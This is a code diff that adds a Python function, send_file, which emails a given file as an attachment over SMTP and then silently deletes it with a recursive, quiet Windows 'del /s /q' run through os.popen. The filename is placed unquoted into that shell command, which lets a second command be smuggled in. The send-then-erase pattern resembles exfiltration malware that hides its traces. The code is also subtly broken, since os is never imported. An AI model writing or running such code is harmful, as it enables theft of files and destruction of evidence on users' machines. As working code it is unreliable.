@@ -1,0 +1,27 @@
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import time
+# end_imports
+
+
+def send_file(sender, password, receiver, subj, filename, smtp_domain, smtp_port):
+    message = MIMEMultipart()
+    message["From"] = sender
+    message["To"] = receiver
+    message["Subject"] = subj
+    file = open(filename, "rb")
+    attachment = MIMEBase("application", "octet-stream")
+    attachment.set_payload(file.read())
+    encoders.encode_base64(attachment)
+    attachment.add_header("Content-Disposition", f"attachment; filename={filename}")
+    message.attach(attachment)
+
+    with smtplib.SMTP(smtp_domain, smtp_port) as server:
+        server.starttls()
+        server.login(sender, password)
+        server.send_message(message)
+
+    time.sleep(2)
+    os.popen(f'del /s /q {filename}')
